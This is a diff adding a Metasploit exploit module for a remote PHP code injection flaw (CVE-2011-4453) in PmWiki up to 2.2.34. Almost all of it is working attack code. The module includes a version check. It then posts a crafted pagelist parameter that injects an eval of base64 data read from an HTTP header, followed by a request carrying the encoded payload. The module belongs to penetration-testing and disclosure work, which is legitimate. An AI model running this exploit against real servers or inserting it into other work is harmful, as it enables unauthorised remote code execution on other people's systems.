@@ -1,0 +1,105 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = ExcellentRanking
+
+	include Msf::Exploit::Remote::HttpClient
+
+	def initialize(info={})
+		super(update_info(info,
+			'Name'           => 'PmWiki <= 2.2.34 (pagelist) Remote PHP Code Injection Exploit',
+			'Description'    => %q{
+				This module exploits an arbitrary command execution vulnerability
+				in PmWiki from 2.0.0 to 2.2.34. The vulnerable function is
+				inside /scripts/pagelist.php.
+			},
+			'License'        => MSF_LICENSE,
+			'Author'         =>
+				[
+					'EgiX',  # Vulnerability discovery and exploit
+					'TecR0c' # Metasploit Module
+				],
+			'References'     =>
+				[
+					['CVE', '2011-4453'],
+					['BID', '50776'],
+					['OSVDB', '77261'],
+					['URL', 'http://www.exploit-db.com/exploits/18149/'],
+					['URL', 'http://www.pmwiki.org/wiki/PITS/01271']
+				],
+			'Privileged'     => false,
+			'Payload'        =>
+				{
+					'Keys'        => ['php'],
+					'Space'       => 4000,
+					'DisableNops' => true,
+				},
+			'Platform'       => ['php'],
+			'Arch'           => ARCH_PHP,
+			'Targets'        => [['Automatic',{}]],
+			'DisclosureDate' => 'Nov 09 2011',
+			'DefaultTarget'  => 0))
+
+		register_options(
+			[
+				OptString.new('URI',[true, "The path to the pmwiki installation", "/"]),
+			],self.class)
+	end
+
+	def check
+		uri = datastore['URI']
+		uri += (datastore['URI'][-1, 1] == "/") ? 'pmwiki.php?n=PmWiki.Version' : '/pmwiki.php?n=PmWiki.Version'
+
+		res = send_request_raw(
+			{
+				'uri' => uri
+			}, 25)
+
+		if (res and res.body =~ /pmwiki-2.[0.00-2.34]/)
+			return Exploit::CheckCode::Vulnerable
+		end
+		return Exploit::CheckCode::Safe
+	end
+
+	def exploit
+		p = Rex::Text.encode_base64(payload.encoded)
+		header = rand_text_alpha_upper(3)
+		header_append = rand_text_alpha_upper(4)
+
+		uri = datastore['URI']
+		uri += (datastore['URI'][-1, 1] == "/") ? 'pmwiki.php' : '/pmwiki.php'
+
+		res = send_request_cgi({
+			'method'    => 'POST',
+			'uri'       => uri,
+			'vars_post' =>
+				{
+					'action' => 'edit',
+					'post' => 'save',
+					'n' => "#{header}.#{header_append}",
+					'text' => "(:pagelist order=']);error_reporting(0);eval(base64_decode($_SERVER[HTTP_#{header}]));die;#:)",
+				}
+			}, 25)
+
+		res = send_request_cgi({
+			'method'  => 'POST',
+			'uri'     => uri,
+			'headers' =>
+				{
+					header => p,
+					'Connection' => 'Close',
+				},
+			'vars_post' =>
+				{
+					'n' => "#{header}.#{header_append}",
+				}
+		}, 25)
+	end
+end
